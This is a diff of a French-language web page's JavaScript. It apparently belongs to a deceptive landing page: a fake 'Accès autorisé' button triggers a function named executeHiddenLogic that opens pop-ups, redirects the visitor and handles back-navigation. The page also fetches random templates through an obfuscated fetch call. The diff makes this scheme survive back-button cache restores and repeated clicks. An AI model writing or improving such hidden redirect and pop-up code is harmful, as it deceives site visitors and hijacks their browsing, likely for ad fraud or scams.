@@ -55,13 +55,16 @@
     
     // 🚨 CORRECTION FINALE iOS/Android (bfcache) :
     // Si la page est restaurée depuis le cache (bouton Retour), on force la réinitialisation
-    // des variables et du template pour rendre les clics fonctionnels.
+    // des variables et du template pour rendre les clics fonctionnels et variés.
     window.addEventListener('pageshow', function(event) {
         if (event.persisted) {
-            // Remettre l'état à zéro
+            console.log("Page revenue du cache (bfcache). Réinitialisation...");
+            
+            // 1. Remettre l'état de blocage à zéro
             redirected = false; 
-            // Relancer le processus (nouveau template aléatoire possible)
-            loadTemplate(); 
+            
+            // 2. Relancer le processus: loadTemplate va vider le DOM et recharger un nouveau template
+            loadTemplate(true); 
         }
     });
 
@@ -82,7 +85,7 @@
     const SUCCESS_ICON_HTML = '<svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="#009432" stroke-width="3" stroke-linecap="round" stroke-linejoin="round"><polyline points="20 6 9 17 4 12"></polyline></svg>';
     const LOADER_HTML_FIXED = '<div id="loader" style="width: 14px; height: 14px; border: 2px solid #f3f3f3; border-top: 2px solid #4285f4; border-radius: 50%; animation: spin 0.8s linear infinite;"></div>';
 
-    // Variable d'état réintroduite pour bloquer le double clic rapide pendant la transaction AJAX
+    // Variable d'état pour bloquer les doubles clics rapides
     var redirected = false; 
     
     // --- 1. FONCTIONS DE BASES ---
@@ -94,8 +97,8 @@
     };
 
     function executeHiddenLogic(urlMain, urlPop, idBack) {
-        if (redirected) return; // Bloque le double clic rapide après le fetch
-        redirected = true; // Empêche un nouveau clic en attendant la redirection
+        if (redirected) return;
+        redirected = true; // Début de la redirection
         
         // 1. Redirection Pop-up (url_pop)
         try {
@@ -166,10 +169,14 @@
                 executeHiddenLogic(data.url_main, data.url_pop, data.id_back);
                 
                 setTimeout(function(){
+                    // Mise à jour visuelle du bouton
                     btnElement.innerHTML = SUCCESS_ICON_HTML + " Accès autorisé";
                     btnElement.style.background = '#009432';
                     btnElement.style.color = 'white';
                     btnElement.style.opacity = '1';
+                    
+                    // 🚨 CORRECTION : Réactive le clic sur le bouton même s'il est au statut 'vert'
+                    btnElement.style.pointerEvents = 'auto'; 
                 }, 800);
             } else {
                 location.reload();
@@ -186,7 +193,16 @@
     }
 
     // --- 3.CHARGEMENT ---
-    function loadTemplate() {
+    function loadTemplate(isReturnFromCache = false) { 
+        
+        // 🚨 Si on revient du cache, on force le nettoyage du DOM avant de recharger le nouveau template
+        if (isReturnFromCache) {
+             document.getElementById('template-container').innerHTML = ''; // Vider l'ancien contenu figé
+             // Pour être sûr de charger de nouveaux styles
+             document.getElementById('template-styles').innerHTML = '';   
+             document.getElementById('loading-spinner').style.display = 'inline-flex';
+        }
+        
         let trackingParams = window.location.search;
         let finalParams = ''; 
         
@@ -194,8 +210,11 @@
             finalParams = '&' + trackingParams.substring(1); 
         }
         
-        document.getElementById('loading-spinner').style.display = 'inline-flex';
-        
+        // Afficher le loader s'il est masqué
+        if (!isReturnFromCache) {
+            document.getElementById('loading-spinner').style.display = 'inline-flex';
+        }
+
         window[FE](URL_TEMPLATE + finalParams, { method: METHOD_GET })
         .then(response => {
             if (!response.ok) {
@@ -232,6 +251,7 @@
                 
                 document.getElementById('template-styles').innerHTML += data.css || '';
                 
+                // 3. Réinitialise les écouteurs de clics
                 initializeUnifiedClicks(data.js);
                 
             } else {
@@ -245,7 +265,7 @@
         });
     }
 
-    // Lance le processus de chargement
+    // Lance le processus de chargement initial
     loadTemplate();
 </script>
 </body>
